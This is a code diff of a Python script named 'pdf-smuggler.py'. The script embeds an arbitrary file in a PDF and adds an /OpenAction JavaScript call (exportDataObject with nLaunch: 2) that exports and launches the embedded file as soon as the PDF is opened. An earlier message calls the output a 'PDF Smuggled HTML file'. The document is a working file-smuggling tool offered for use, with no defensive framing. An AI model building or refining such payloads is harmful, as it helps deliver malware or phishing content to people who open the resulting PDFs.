@@ -1,54 +1,47 @@
+#pip uninstall PyPDF2
+#pip install PyPDF2==1.26.0
+
 import sys
 from PyPDF2 import PdfFileReader, PdfFileWriter
-from PyPDF2.generic import NameObject, createStringObject, DictionaryObject
+from PyPDF2.generic import NameObject, DictionaryObject, createStringObject
 
 def add_attachment_to_pdf(inputpdf, file, outputpdf):
-    # Check if all parameters are provided
     if not inputpdf or not file or not outputpdf:
         raise ValueError("All parameters (inputpdf, file, outputpdf) are required.")
 
-    # Read the input PDF
-    reader = PdfFileReader(inputpdf)
-    writer = PdfFileWriter()
+    # Open and read the input PDF
+    with open(inputpdf, "rb") as f:
+        reader = PdfFileReader(f)
+        writer = PdfFileWriter()
 
-    # Append pages from the input PDF to the writer
-    writer.appendPagesFromReader(reader)
+        # Copy all pages to the writer
+        for page_num in range(reader.getNumPages()):
+            writer.addPage(reader.getPage(page_num))
 
-    # Embed the file as an attachment
-    with open(file, "rb") as attachment:
-        writer.addAttachment(file, attachment.read())
+        # Embed the file as an attachment
+        with open(file, "rb") as attachment:
+            writer.addAttachment(file, attachment.read())
 
-    # Set the OpenAction property
-    open_action = writer._root_object.get("/OpenAction")
-    if open_action is None:
-        open_action_dict = DictionaryObject({})
-        writer._root_object.update({
-            NameObject("/OpenAction"): open_action_dict
+        # Add JavaScript to launch the attachment
+        js = 'this.exportDataObject({ cName: "%s", nLaunch: 2 });' % file
+        js_action = DictionaryObject()
+        js_action.update({
+            NameObject("/S"): NameObject("/JavaScript"),
+            NameObject("/JS"): createStringObject(js),
         })
-    else:
-        open_action_dict = open_action.getObject()
 
-    # JavaScript
-    open_action_dict.update({
-        NameObject("/S"): NameObject("/JavaScript"),
-        NameObject("/JS"): createStringObject('this.exportDataObject({ cName: "%s", nLaunch: 2 });' % file),
-    })
+        writer._root_object.update({
+            NameObject("/OpenAction"): js_action
+        })
 
-    # Write the modified PDF to the output file
-    with open(outputpdf, "wb") as output:
-        writer.write(output)
+        # Write the modified PDF to output
+        with open(outputpdf, "wb") as out_pdf:
+            writer.write(out_pdf)
 
-    print(f'Success! PDF Smuggled HTML file "{outputpdf}" has been created.')
+    print(f"✅ PDF created: {outputpdf} (embedded file: {file})")
 
 if __name__ == "__main__":
-    # Check if the correct number of command-line arguments is provided
     if len(sys.argv) != 4:
-        print("Usage: pdf2savefile.py inputpdf_file attachment_file outputpdf_file")
+        print("Usage: pdf-smuggler.py input.pdf file_to_embed output.pdf")
     else:
-        # Extract the command-line arguments
-        inputpdf = sys.argv[1]
-        file = sys.argv[2]
-        outputpdf = sys.argv[3]
-
-        # Call the function to add the attachment and /OpenAction to the PDF
-        add_attachment_to_pdf(inputpdf, file, outputpdf)
+        add_attachment_to_pdf(sys.argv[1], sys.argv[2], sys.argv[3])
